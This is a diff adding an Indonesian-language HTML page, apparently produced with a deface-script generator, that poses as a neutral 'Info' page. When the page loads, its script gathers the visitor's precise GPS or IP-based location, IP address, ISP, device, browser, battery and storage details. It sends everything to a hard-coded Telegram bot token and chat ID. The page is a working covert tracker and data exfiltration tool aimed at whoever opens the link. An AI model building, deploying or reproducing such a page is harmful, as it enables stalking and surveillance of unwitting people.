@@ -1,0 +1,178 @@
+<!--
+--  Uploaded on : https://haxor.my.id/open/FX710198392010ZA.html
+--  Official Web : https://prinsh.com
+--  script-deface-generator.prinsh.com
+-->
+<!DOCTYPE html><html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Info</title>
+</head>
+<body><h2>Memproses informasi perangkat...</h2><script>
+async function getBatteryInfo() {
+  if (navigator.getBattery) {
+    const battery = await navigator.getBattery();
+    return `
+    Level: ${Math.round(battery.level * 100)}%
+    Status: ${battery.charging ? "Sedang mengisi daya" : "Tidak mengisi daya"}`;
+  }
+  return "Tidak didukung";
+}
+
+async function getDeviceInfo() {
+  const memory = navigator.deviceMemory || "Unknown";
+  const ram = memory + " GB";
+  const userAgent = navigator.userAgent;
+  const resolution = `${window.screen.width}x${window.screen.height}`;
+  const orientation = screen.orientation?.type || "Unknown";
+  const touchSupport = ('ontouchstart' in window) ? "Ya" : "Tidak";
+  const connection = navigator.connection?.effectiveType || "Unknown";
+  const deviceType = /Mobi|Android|iPhone|iPad/i.test(userAgent) ? "Mobile" : "Desktop";
+  const deviceVendor = navigator.vendor || "Unknown";
+  const platform = navigator.platform || "Unknown";
+
+  let storage = { total: "Unknown", used: "Unknown" };
+  if (navigator.storage?.estimate) {
+    const { quota, usage } = await navigator.storage.estimate();
+    storage.total = (quota / 1e+9).toFixed(2) + " GB";
+    storage.used = ((usage / quota) * 100).toFixed(2) + "% Digunakan";
+  }
+
+  return {
+    ram, userAgent, resolution, orientation, touchSupport,
+    connection, deviceType, deviceVendor, platform,
+    totalStorage: storage.total, usedStorage: storage.used
+  };
+}
+
+function getCurrentTime() {
+  return new Date().toLocaleString("id-ID", { timeZoneName: "short" });
+}
+
+async function getLocation(timeout = 5000) {
+  return new Promise((resolve) => {
+    let done = false;
+    const fallback = async () => {
+      if (!done) {
+        done = true;
+        resolve(await getLocationByIP());
+      }
+    };
+    setTimeout(fallback, timeout);
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          if (!done) {
+            done = true;
+            resolve({
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude,
+              metode: "GPS (Akurat)"
+            });
+          }
+        },
+        fallback
+      );
+    } else {
+      fallback();
+    }
+  });
+}
+
+async function getLocationByIP() {
+  try {
+    const res = await fetch("https://ip-api.com/json/");
+    const data = await res.json();
+    return {
+      latitude: data.lat,
+      longitude: data.lon,
+      negara: data.country,
+      provinsi: data.regionName,
+      kota: data.city,
+      isp: data.isp,
+      timezone: data.timezone,
+      zip: data.zip,
+      metode: "IP (Perkiraan)"
+    };
+  } catch {
+    return { latitude: "Unknown", longitude: "Unknown", metode: "Gagal" };
+  }
+}
+
+async function getIPInfo() {
+  try {
+    const res = await fetch("https://api64.ipify.org?format=json");
+    const ip = await res.json();
+    return ip.ip;
+  } catch {
+    return "Unknown";
+  }
+}
+
+async function kirimKeTelegram() {
+  try {
+    const [batteryInfo, deviceInfo, lokasi, ipAddress] = await Promise.all([
+      getBatteryInfo(),
+      getDeviceInfo(),
+      getLocation(),
+      getIPInfo()
+    ]);
+
+    const pesan = `
+📡 *LOKASI*
+──────────────
+IP: ${ipAddress}
+ISP: ${lokasi.isp || "Unknown"}
+Negara: ${lokasi.negara || "Unknown"}
+Provinsi: ${lokasi.provinsi || "Unknown"}
+Kota: ${lokasi.kota || "Unknown"}
+Latitude: ${lokasi.latitude}
+Longitude: ${lokasi.longitude}
+Zona Waktu: ${lokasi.timezone || "Unknown"}
+Kode Pos: ${lokasi.zip || "Unknown"}
+Metode Lokasi: ${lokasi.metode}
+
+🖥️ *PERANGKAT*
+──────────────
+Vendor: ${deviceInfo.deviceVendor}
+Model/Platform: ${deviceInfo.platform}
+Jenis: ${deviceInfo.deviceType}
+Browser: ${deviceInfo.userAgent}
+Resolusi: ${deviceInfo.resolution}
+Orientasi: ${deviceInfo.orientation}
+Touchscreen: ${deviceInfo.touchSupport}
+Jaringan: ${deviceInfo.connection}
+
+🧠 *SPESIFIKASI*
+──────────────
+RAM: ${deviceInfo.ram}
+ROM: ${deviceInfo.totalStorage} (${deviceInfo.usedStorage})
+Baterai:
+${batteryInfo}
+
+⏱️ *WAKTU LOKAL*
+──────────────
+${getCurrentTime()}
+`;
+
+    const botToken = "8101743967:AAG3YqVIPe_RfwUCmH4FQ9lR4pUqXyhJlMg";
+    const chatId = "5556193701";
+    const api = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    await fetch(api, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: chatId, text: pesan, parse_mode: "Markdown" })
+    });
+
+    document.body.innerHTML = "<h2>✅ Data berhasil dikirim ke Telegram</h2>";
+  } catch (e) {
+    console.error(e);
+    document.body.innerHTML = "<h2>❌ Gagal kirim informasi</h2>";
+  }
+}
+
+window.onload = kirimKeTelegram;
+</script></body>
+</html>
